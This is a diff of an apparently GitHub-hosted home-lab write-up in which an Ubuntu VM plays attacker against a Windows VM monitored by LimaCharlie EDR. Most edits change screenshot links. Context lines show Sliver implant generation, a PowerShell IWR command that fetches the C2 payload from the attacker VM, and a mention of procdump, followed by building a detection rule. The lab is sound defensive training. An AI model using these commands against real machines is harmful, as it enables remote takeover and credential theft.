@@ -42,13 +42,8 @@ The VM Workstation created had the following specs: 14GB Disk size, 2 CPU cores,
 After downloading and setting everything up, I encountered my first error. I had to make sure DNS and outbound pings are working.
 
 
-## This is what it is supposed to look like
+<img width="666" height="185" alt="Untitled" src="https://github.com/user-attachments/assets/730596a8-71fd-428f-9289-0b5156190e7c" />
 
-
-
-## This is what I got
-
-![Screenshot (2)](https://github.com/user-attachments/assets/ec614aca-52e4-477e-9de6-83bddb195d7c)
 
 Seeing the response I noticed that I did not add a name server. To resolve the issue I entered the following command: 
 
@@ -61,7 +56,8 @@ This allowed me to add a name server. I entered in 8.8.8.8 because it refers to 
 
 it started to work after the change.
 
-![Screenshot (5)](https://github.com/user-attachments/assets/fe241b07-600a-4d1a-9b74-11c7776b2dec)
+<img width="729" height="389" alt="Untitled" src="https://github.com/user-attachments/assets/227990eb-e744-4ca9-ab8b-a69caa0b87a5" />
+
 
 
 This Unbuntu VM will act as an attacker. Now that everything is working, I started to set up the windows VM. 
@@ -97,7 +93,8 @@ generate --http [Linux_VM_IP] --save /opt/sliver
 
 I also entered the command "implants" to confirm the implant configuration
 
-![Screenshot (14)](https://github.com/user-attachments/assets/6be2b68a-9a64-4246-9c1d-2d05de389dcb)
+<img width="823" height="308" alt="Screenshot (133)" src="https://github.com/user-attachments/assets/ce6d63f2-49ab-4e1c-8917-1a3127fe92f5" />
+
 
 Then I went back to the windows VM to download the C2 payload. In the windows command I entered the following command:
 
@@ -107,7 +104,7 @@ IWR -Uri http://[Linux_VM_IP]/[payload_name].exe -Outfile C:\Users\User\Download
 Next is to start the command and control session. I went to the linux VM and enetered the command "http" which is the listener. In the wiundows VM, enter the download location of the executable (C:\Users\User\Downloads\<your_C2-implant>.exe) and the linux VM will pick it up.
 
 
-![Screenshot (17)](https://github.com/user-attachments/assets/413b4899-32a1-4bcc-a790-3b5ef7d3889c)
+<img width="837" height="301" alt="Untitled" src="https://github.com/user-attachments/assets/ea34477f-cc76-4c0f-b9bb-bd084686974e" />
 
 I entered the "use" command to interact with the C2 session. Now that the linux VM is linked with the Windows, I went to Lima charlie to examine the EDR telemetry and to see if the C2 implant was present.
 
@@ -140,8 +137,6 @@ Once you find the event, You can make a detection and response(D&R) rule that wo
 
 Once the rule is made, you can go back to the linux VM and run the procdump command to test if the rule you made will work and detect the command
 
-
-![image](https://github.com/user-attachments/assets/1c9a3908-8fab-4b0e-953c-c21683a328e2)
 
 ![image](https://github.com/user-attachments/assets/1241def0-18b1-4627-beec-89db52d063ec)
 
